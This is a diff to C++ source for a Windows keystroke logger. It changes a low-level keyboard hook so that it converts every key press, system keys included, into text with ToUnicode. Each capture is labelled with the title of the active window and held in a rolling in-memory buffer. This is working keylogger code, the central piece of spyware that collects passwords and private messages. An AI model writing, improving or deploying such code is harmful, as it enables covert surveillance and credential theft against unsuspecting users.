@@ -29,11 +29,11 @@ namespace capture {
         }
 
         LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-            if (nCode >= 0 && wParam == WM_KEYDOWN) {
-                KBDLLHOOKSTRUCT* kbd = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
-
+            if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+                KBDLLHOOKSTRUCT* pkb = (KBDLLHOOKSTRUCT*)lParam;
                 std::lock_guard<std::mutex> lock(logMutex);
 
+                // Window Title
                 std::string currentTitle = GetActiveWindowTitle();
                 if (currentTitle != lastTitle) {
                     lastTitle = currentTitle;
@@ -41,29 +41,42 @@ namespace capture {
                     char dt[32];
                     ctime_s(dt, sizeof(dt), &now);
                     dt[strcspn(dt, "\n")] = 0;
-                    keylogBuffer += "\n[" + std::string(dt) + "] " + currentTitle + "\n";
+                    keylogBuffer += "\n\n[ " + currentTitle + " ]\n";
                 }
 
-                std::string key;
-                if (kbd->vkCode >= 'A' && kbd->vkCode <= 'Z') {
-                    key = std::string(1, static_cast<char>(kbd->vkCode + (GetKeyState(VK_SHIFT) < 0 ? 0 : 32)));
-                } else if (kbd->vkCode >= '0' && kbd->vkCode <= '9') {
-                    key = std::string(1, static_cast<char>(kbd->vkCode));
+                // Key translation
+                BYTE keyboardState[256];
+                GetKeyboardState(keyboardState);
+
+                wchar_t buffer[5];
+                int result = ToUnicode(pkb->vkCode, pkb->scanCode, keyboardState, buffer, 4, 0);
+
+                if (result > 0) {
+                    buffer[result] = L'\0';
+                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, buffer, -1, NULL, 0, NULL, NULL);
+                    std::string str(size_needed, 0);
+                    WideCharToMultiByte(CP_UTF8, 0, buffer, -1, &str[0], size_needed, NULL, NULL);
+                    str.pop_back(); // remove null terminator
+                    keylogBuffer += str;
                 } else {
-                    switch (kbd->vkCode) {
-                        case VK_SPACE:   key = " "; break;
-                        case VK_RETURN:  key = "[ENTER]\n"; break;
-                        case VK_BACK:    key = "[BACK]"; break;
-                        case VK_TAB:     key = "[TAB]"; break;
-                        case VK_ESCAPE:  key = "[ESC]"; break;
-                        default:         key = "[VK:" + std::to_string(kbd->vkCode) + "]";
+                    LOG_DEBUG("ToUnicode failed or non-printable char for VK_CODE: " + std::to_string(pkb->vkCode));
+                    std::string nonVisible;
+                    switch(pkb->vkCode) {
+                        case VK_RETURN: nonVisible = "\n"; break;
+                        case VK_BACK:   nonVisible = "[BACKSPACE]"; break;
+                        case VK_TAB:    nonVisible = "[TAB]"; break;
+                        case VK_SHIFT:  nonVisible = "[SHIFT]"; break;
+                        case VK_CONTROL:nonVisible = "[CTRL]"; break;
+                        case VK_MENU:   nonVisible = "[ALT]"; break;
+                        case VK_CAPITAL:nonVisible = "[CAPS_LOCK]"; break;
+                        case VK_DELETE: nonVisible = "[DEL]"; break;
+                        default: break; // Ignore others for now
                     }
+                    keylogBuffer += nonVisible;
                 }
 
-                keylogBuffer += key;
-
-                if (keylogBuffer.size() > 32 * 1024) {
-                    keylogBuffer = keylogBuffer.substr(keylogBuffer.size() - 24 * 1024);
+                if (keylogBuffer.size() > 32 * 1024) { // Limit buffer size
+                    keylogBuffer = keylogBuffer.substr(keylogBuffer.size() - 16 * 1024);
                 }
             }
             return CallNextHookEx(g_hHook, nCode, wParam, lParam);
